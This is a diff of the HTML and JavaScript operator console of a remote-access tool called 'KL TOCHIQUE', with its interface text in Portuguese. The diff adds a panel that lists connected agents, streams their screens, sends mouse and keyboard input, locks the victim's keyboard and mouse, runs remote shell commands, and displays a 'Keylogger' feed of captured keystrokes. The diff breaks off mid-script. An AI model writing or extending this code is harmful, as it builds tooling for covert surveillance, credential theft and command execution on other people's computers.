@@ -2,157 +2,173 @@
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>KL TOCHIQUE - CONSOLE</title>
+<title>KL TOCHIQUE</title>
 <style>
+/* CSS INTEGRAL */
 @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');
-:root{--bg:#050807;--panel:rgba(9,15,12,.88);--panel-2:rgba(12,22,17,.78);--line:rgba(84,255,160,.15);--line-strong:rgba(84,255,160,.28);--green:#54ffa0;--green-2:#2ee67c;--text:#e7fff0;--shadow:#1a1b1c;}
+:root{--bg:#050807;--panel:rgba(9,15,12,.88);--panel-2:rgba(12,22,17,.78);--line:rgba(84,255,160,.15);--line-strong:rgba(84,255,160,.28);--green:#54ffa0;--green-2:#2ee67c;--text:#e7fff0;--muted:#7f9a89;--danger:#ff4d6d;--warn:#ffcf5a;--shadow:0 20px 80px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.02);}
 body,html{height:100%;margin:0;padding:0;}
-body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);}
-canvas{cursor:crosshair;border-radius:8px;border:2px solid #444;background:#000;max-width:100%;display:block;margin:0 auto;}
-a{text-decoration:none;color:var(--text);}
-h2,h3{font-family:'IBM Plex Mono',monospace;font-size:1.1em;margin:0;padding:0;}
-h2{border-bottom:1px solid var(--line);padding-bottom:3px;margin-bottom:10px;}
-select,button,input[type="password"],input[type="text"]{padding:5px;border-radius:4px;border:1px solid var(--line);background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;}
-select{width:100%;padding:3px;}
-button{background:var(--green);color:#000;border:none;padding:6px 10px;margin-right:10px;cursor:pointer;font-family:'IBM Plex Mono',monospace;font-weight:600;}
-button:hover{background:var(--green-2);}
-input{width:100%;padding:4px;box-sizing:border-box;}
-input:focus{outline:none;box-shadow:0 0 5px var(--line-strong);transition:.2s;}
-.control-banner{position:fixed;top:10px;left:50%;transform:translateX(-50%);padding:6px 12px;background:#00000099;color:var(--text);border:1px solid var(--danger);border-radius:4px;box-shadow:0 0 8px rgba(0,0,0,.7);z-index:1000;display:none;}
-#agents{padding:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px;}
-.agent{border-radius:12px;padding:15px;background:var(--panel);border:1px solid var(--line);margin-bottom:10px;}
-#screenWrap{display:flex;justify-content:center;padding:20px;}
-#metrics{padding:20px;display:flex;gap:15px;flex-wrap:wrap;}
-.metric-box{background:var(--panel);padding:10px;border-radius:5px;border:1px solid var(--line);font-size:0.8em;font-family:'IBM Plex Mono',monospace;}
-.config-panel{padding:20px;background:var(--panel);border-bottom:1px solid var(--line);display:flex;gap:10px;align-items:center;flex-wrap:wrap;}
-input{width:200px;padding:8px;border-radius:4px;background:#07100b;color:white;border:1px solid var(--line);}
+body{font-family:Inter,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,rgba(255,255,255,.012) 0,rgba(255,255,255,.012) 1px,transparent 1px,transparent 3px);mix-blend-mode:soft-light;}
+.wrap{max-width:1500px;margin:0 auto;padding:28px 22px 60px}
+.wrap>h1{margin:0 0 18px;font-family:'IBM Plex Mono',monospace;font-size:clamp(24px,3vw,38px);letter-spacing:-1px;font-weight:700;display:flex;align-items:center;gap:12px;}
+.wrap>h1::before{content:"//";color:var(--green);text-shadow:0 0 20px rgba(84,255,160,.55);}
+.top,.card,.viewer{background:linear-gradient(180deg,rgba(11,18,14,.96),rgba(6,10,8,.96));border:1px solid var(--line);border-radius:14px;box-shadow:var(--shadow);backdrop-filter:blur(16px);}
+.top{padding:14px;margin-bottom:14px;position:relative;overflow:hidden}
+.row{display:flex;gap:9px;align-items:center;flex-wrap:wrap}
+input,select{color:var(--text);background:#07100b;border:1px solid var(--line-strong);border-radius:9px;padding:11px 12px;min-width:240px;outline:none;font-family:'IBM Plex Mono',monospace;transition:.2s ease;}
+button{padding:10px 14px;border:1px solid var(--line-strong);background:linear-gradient(180deg,#0c1710,#08100b);color:#cffff0;border-radius:8px;cursor:pointer;font-family:'IBM Plex Mono',monospace;font-weight:600;transition:.18s ease;}
+button:hover{border-color:var(--green);color:#fff;}
+#connectBtn,#applyProfile{background:linear-gradient(180deg,#163522,#0f2418);border-color:rgba(84,255,160,.48);color:var(--green)}
+.status{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:13px}
+.ok{color:var(--green)}.bad{color:var(--danger)}.wait{color:var(--warn)}
+#agents{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:12px;margin-bottom:14px}
+.card{padding:16px;margin:0;position:relative;overflow:hidden;border:1px solid var(--line);border-radius:14px;}
+.agent-title{font:700 16px 'IBM Plex Mono',monospace;color:#effff5;margin-bottom:6px}
+.small{color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace}
+.badge{display:inline-block;padding:3px 7px;border:1px solid var(--line);border-radius:999px;background:#0b1710;font-size:11px;color:var(--green)}
+.viewer{padding:16px;position:relative;overflow:hidden}
+.toolbar{margin-bottom:12px;padding:10px;border:1px solid rgba(84,255,160,.09);border-radius:10px;background:rgba(255,255,255,.012)}
+.control-banner{margin:10px 0;padding:11px 12px;border-radius:9px;background:rgba(255,77,109,.08);border:1px solid rgba(255,77,109,.25);color:#ff8ba0;font:700 12px 'IBM Plex Mono',monospace;display:none}
+.screen-wrap{position:relative;background:#010302;border:1px solid rgba(84,255,160,.2);border-radius:12px;overflow:hidden;display:flex;justify-content:center;align-items:center;min-height:460px;box-shadow:inset 0 0 40px rgba(0,0,0,.7);cursor: crosshair;}
+canvas{display:block;max-width:100%;height:auto;outline:none;}
+.metrics{margin-top:10px;display:grid;grid-template-columns:repeat(4,minmax(120px,1fr));gap:8px}
+.metrics span{padding:9px 10px;background:#07100b;border:1px solid rgba(84,255,160,.1);border-radius:8px;color:#9bb8a5;font:500 11px 'IBM Plex Mono',monospace}
+.advanced-section{margin-top:16px;padding-top:16px;border-top:1px solid var(--line)}
+.terminal-box{background:#020503;color:var(--green);padding:13px;border:1px solid rgba(84,255,160,.18);border-radius:9px;font-family:'IBM Plex Mono',monospace;min-height:120px;max-height:230px;overflow-y:auto;font-size:12px;margin-top:9px;white-space:pre-wrap;}
+.keylog-container{min-height:150px;max-height:300px;overflow-y:auto;margin-top:18px;padding:14px;border:1px solid rgba(84,255,160,.1);border-radius:10px;background:rgba(2,5,3,.7)}
+.log-entry{font-family:'IBM Plex Mono',monospace;font-size:12px;padding:7px 5px;border-bottom:1px solid rgba(84,255,160,.07);color:#b8cbbf}
+.log-time{color:#51665a;margin-right:8px;font-size:11px}.log-key{font-weight:700;color:var(--green)}.log-down{color:#7bffb2;font-weight:700}.log-up{color:#ff7189}
 </style>
 </head>
-<body>
+<body id="body">
+<div class="wrap">
+    <h1 id="mainTitle">KL TOCHIQUE</h1>
+    <div class="top">
+        <div class="row">
+            <input id="wsUrl" placeholder="wss://seu-realtime.up.railway.app">
+            <input id="token" type="password" placeholder="ADMIN_TOKEN">
+            <button id="connectBtn">Conectar</button>
+            <span id="connStatus" class="status"></span>
+        </div>
+    </div>
 
-<div id="controlBanner" class="control-banner">🔴 Controle remoto ativo</div>
+    <div id="agents"></div>
 
-<div class="config-panel">
-    <input id="wsUrl" type="text" placeholder="URL do Servidor (wss://...)">
-    <input id="token" type="password" placeholder="Token de Admin">
-    <button id="connectBtn">Conectar</button>
-    <span id="connStatus" style="font-size:0.8em;"></span>
-</div>
+    <div class="viewer">
+        <h2 id="viewTitle">Tela ao vivo</h2>
+        <div class="toolbar row">
+            <label>Perfil:</label>
+            <select id="profile">
+                <option value="fluid">Fluido — 1280px / 30 FPS</option>
+                <option value="balanced" selected>Equilibrado — 1600px / 25 FPS</option>
+                <option value="quality">Qualidade — 1920px / 20 FPS</option>
+            </select>
+            <button id="applyProfile">Aplicar perfil</button>
+            <button id="fullBtn">Tela cheia</button>
+        </div>
 
-<div id="agents">
-  <h2 style="grid-column: 1/-1; font-family:'IBM Plex Mono';">Agentes Online</h2>
-  <div id="agentsList">
-      <!-- Lista de agentes carregada via JS -->
-  </div>
-</div>
+        <div id="controlBanner" class="control-banner">🔴 Controle remoto ativo</div>
 
-<div id="screenWrap">
-  <canvas id="screen"></canvas>
-</div>
+        <div class="screen-wrap" id="screenWrap">
+            <canvas id="screen" tabindex="0"></canvas>
+        </div>
 
-<div id="metrics">
-  <div class="metric-box">FPS: <span id="fps">0</span></div>
-  <div class="metric-box">Recebimento: <span id="bitrate">0</span> Mbps</div>
-  <div class="metric-box">Frames: <span id="frames">0</span></div>
-  <div class="metric-box">Drops: <span id="drops">0</span></div>
-</div>
+        <div class="metrics">
+            <span id="fps">FPS: 0</span>
+            <span id="bitrate">Recebimento: 0 Mbps</span>
+            <span id="frames">Frames: 0</span>
+            <span id="drops">Drops: 0</span>
+        </div>
 
-<div id="advancedControls" style="padding:20px; display:none;">
-    <h2 style="font-family:'IBM Plex Mono';">Controle de Sistema</h2>
-    <button id="btnLockInput">🔒 Bloquear Teclado/Mouse</button>
-    <button id="btnUnlockInput">🔓 Desbloquear</button>
+        <div id="advancedControls" class="advanced-section" style="display:none;">
+            <h3 style="font-family:'IBM Plex Mono';">Controle de Sistema</h3>
+            <div class="row">
+                <button id="btnLockInput" class="lock-btn">🔒 Bloquear Teclado/Mouse</button>
+                <button id="btnUnlockInput" style="display:none;">🔓 Desbloquear</button>
+                <span id="lockStatus" class="small">Status: Desbloqueado</span>
+            </div>
+            <div class="shell-section">
+                <h4 style="margin-bottom:5px; font-family:'IBM Plex Mono';">Terminal Remoto (Shell)</h4>
+                <div class="shell-input-group" style="display:flex; gap:7px; margin-top:10px;">
+                    <input id="shellCommand" placeholder="Comando...">
+                    <button id="btnExecuteShell">Enviar</button>
+                </div>
+                <div id="shellOutput" class="terminal-box">Aguardando comando...</div>
+            </div>
+        </div>
+
+        <div class="keylog-container" id="keylogContainer">
+            <h3 style="margin-top:0; font-family:'IBM Plex Mono';">Console de Eventos (Keylogger)</h3>
+            <div id="keylogList"></div>
+        </div>
+    </div>
 </div>
 
 <script>
+// --- VARIÁVEIS ---
+const wsUrlEl=document.getElementById('wsUrl'),tokenEl=document.getElementById('token'),connectBtn=document.getElementById('connectBtn'),connStatus=document.getElementById('connStatus'),agentsEl=document.getElementById('agents'),canvas=document.getElementById('screen'),ctx=canvas.getContext('2d',{alpha:false}),fpsEl=document.getElementById('fps'),bitrateEl=document.getElementById('bitrate'),framesEl=document.getElementById('frames'),dropsEl=document.getElementById('drops'),profileEl=document.getElementById('profile'),applyProfile=document.getElementById('applyProfile'),controlBanner=document.getElementById('controlBanner'),screenWrap=document.getElementById('screenWrap'),keylogList=document.getElementById('keylogList'),advancedControls=document.getElementById('advancedControls'),btnLockInput=document.getElementById('btnLockInput'),btnUnlockInput=document.getElementById('btnUnlockInput'),lockStatusText=document.getElementById('lockStatus'),shellCommandInput=document.getElementById('shellCommand'),btnExecuteShell=document.getElementById('btnExecuteShell'),shellOutput=document.getElementById('shellOutput');
 
- // --- VARIÁVEIS GLOBAIS ---
-let ws = null;
-let selectedAgentId = null;
-const canvas = document.getElementById('screen');
-const ctx = canvas.getContext('2d');
-const agentsList = document.getElementById('agentsList');
-const controlBanner = document.getElementById('controlBanner');
+let ws=null,agents=[],selectedAgentId=null,frames=0,fpsFrames=0,lastFps=performance.now(),bytesSecond=0,dropped=0,decoding=false,pendingFrame=null;
 
-// --- FUNÇÃO DE CONEXÃO ---
+// --- CONEXÃO ---
 function connect() {
-    const url = document.getElementById('wsUrl').value;
-    const token = document.getElementById('token').value;
-
-    if (!url) return alert("Insira a URL do servidor!");
-
-    ws = new WebSocket(url);
-    ws.binaryType = 'arraybuffer';
+    const url = wsUrlEl.value.trim(), token = tokenEl.value;
+    localStorage.setItem('em_ws', url); localStorage.setItem('em_admin', token);
+    if(!url) return alert("URL necessária!");
+    
+    try { ws = new WebSocket(url); ws.binaryType = 'arraybuffer'; } 
+    catch(e) { alert("Erro ao abrir WebSocket"); return; }
 
     ws.onopen = () => {
-        console.log('Conectado!');
-        document.getElementById('connStatus').textContent = "Conectado";
-        document.getElementById('connStatus').style.color = "var(--green)";
+        setStatus('Conectado', 'ok');
         send({ type: 'admin_hello', token: token });
     };
 
-    ws.onmessage = async (event) => {
-        if (typeof event.data === 'string') {
-            const msg = JSON.parse(event.data);
-            handleTextMessage(msg);
+    ws.onmessage = async (ev) => {
+        if (typeof ev.data === 'string') {
+            let m; try { m = JSON.parse(ev.data); } catch { return; }
+            handleMessage(m);
         } else {
-            renderFrame(event.data);
+            renderFrame(ev.data);
         }
     };
 
-    ws.onclose = () => {
-        document.getElementById('connStatus').textContent = "Desconectado";
-        document.getElementById('connStatus').style.color = "var(--danger)";
-        controlBanner.style.display = 'none';
-    };
-
-    ws.onerror = () => {
-        document.getElementById('connStatus').textContent = "Erro";
-    };
+    ws.onclose = () => setStatus('Desconectado', 'bad');
+    ws.onerror = () => setStatus('Erro de Conexão', 'bad');
 }
 
-function send(obj) {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify(obj));
+function setStatus(t,c=''){ connStatus.textContent=t; connStatus.className='status '+c; }
+function send(o){ if(ws?.readyState===WebSocket.OPEN) ws.send(JSON.stringify(o)); }
+
+function handleMessage(m) {
+    switch(m.type) {
+        case 'agent_list': agents = m.agents || []; renderAgents(); break;
+        case 'metrics': updateMetrics(m); break;
+        case 'keylog': addKeylogEntry(m.key, m.down, m.ts); break;
+        case 'shell_result': shellOutput.textContent += `\n[RES]: ${m.output}\n`; break;
+        case 'lock_ack': updateLockUI(m.status); break;
     }
 }
 
-// --- TRATAMENTO DE MENSAGENS DO SERVIDOR ---
-function handleTextMessage(msg) {
-    switch (msg.type) {
-        case 'agent_list':
-            renderAgents(msg.agents);
-            break;
-        case 'metrics':
-            updateMetrics(msg);
-            break;
-        case 'error':
-            alert('Erro: ' + msg.message);
-            break;
-    }
-}
-
-// --- RENDERIZAÇÃO DE VÍDEO (STREAMING) ---
-function renderFrame(buffer) {
-    const blob = new Blob([buffer], { type: 'image/jpeg' });
+// --- VÍDEO ---
+function renderFrame(buf) {
+    if (decoding) { pendingFrame = buf; dropped++; return; }
+    decoding = true;
+    const blob = new Blob([buf], { type: 'image/jpeg' });
     const url = URL.createObjectURL(blob);
     const img = new Image();
-
     img.onload = () => {
         if (canvas.width !== img.width || canvas.height !== img.height) {
-            canvas.width = img.width;
-            canvas.height = img.height;
+            canvas.width = img.width; canvas.height = img.height;
         }
         ctx.drawImage(img, 0, 0);
         URL.revokeObjectURL(url);
-        updateFrameCount();
+        decoding = false;
+        frames++; fpsFrames++;
+        if (pendingFrame) { const next = pendingFrame; pendingFrame = null; renderFrame(next); }
     };
     img.src = url;
-}
-
-let frameCount = 0;
-function updateFrameCount() {
-    frameCount++;
-    document.getElementById('frames').textContent = frameCount;
 }
 
 function updateMetrics(m) {
@@ -162,79 +178,15 @@ function updateMetrics(m) {
 }
 
 // --- CONTROLE REMOTO (MOUSE E TECLADO) ---
-
 function selectAgent(id) {
     selectedAgentId = id;
     controlBanner.style.display = 'block';
-    document.getElementById('advancedControls').style.display = 'block';
-    console.log("Agente selecionado:", id);
+    advancedControls.style.display = 'block';
     send({ type: 'request_control', agentId: id });
 }
 
 function sendControl(data) {
-    if (selectedAgentId) {
-        send({ type: 'control_input', agentId: selectedAgentId, ...data });
-    }
+    if (selectedAgentId) send({ type: 'control_input', agentId: selectedAgentId, ...data });
 }
 
-// Mouse
-canvas.addEventListener('mousedown', (e) => handleMouseEvent(e, true));
-canvas.addEventListener('mouseup', (e) => handleMouseEvent(e, false));
-canvas.addEventListener('mousemove', (e) => {
-    if (e.buttons > 0) handleMouseEvent(e, true, true);
-});
-
-function handleMouseEvent(e, isDown, isMove = false) {
-    if (!selectedAgentId) return;
-
-    const rect = canvas.getBoundingClientRect();
-    const x = (e.clientX - rect.left) / rect.width;
-    const y = (e.clientY - rect.top) / rect.height;
-
-    if (isMove) {
-        sendControl({ kind: 'move', x, y });
-    } else {
-        let button = e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left');
-        sendControl({ kind: 'mouse', button, down: isDown, x, y });
-    }
-}
-
-// Teclado
-canvas.addEventListener('keydown', (e) => {
-    if (['F5', 'Tab'].includes(e.code)) e.preventDefault();
-    sendControl({ kind: 'key', code: e.code, down: true });
-});
-
-canvas.addEventListener('keyup', (e) => {
-    sendControl({ kind: 'key', code: e.code, down: false });
-});
-
-canvas.addEventListener('contextmenu', e => e.preventDefault());
-
-// --- UI E AGENTES ---
-
-function renderAgents(agents) {
-    const list = document.getElementById('agentsList');
-    list.innerHTML = '';
-    agents.forEach(agent => {
-        const div = document.createElement('div');
-        div.className = 'agent';
-        div.innerHTML = `
-            <h3 style="margin:0">${agent.name}</h3>
-            <span style="display:block; font-size:0.8em; margin-bottom:10px;">${agent.user}</span>
-            <button onclick="selectAgent('${agent.id}')">Conectar e Controlar</button>
-        `;
-        list.appendChild(div);
-    });
-}
-
-// Bloqueio de Input
-document.getElementById('btnLockInput').onclick = () => sendControl({ type: 'input_lock', active: true });
-document.getElementById('btnUnlockInput').onclick = () => sendControl({ type: 'input_lock', active: false });
-
-// Inicialização
-document.getElementById('connectBtn').addEventListener('click', connect);
-
-</script>
-</body>
-</html>
+//
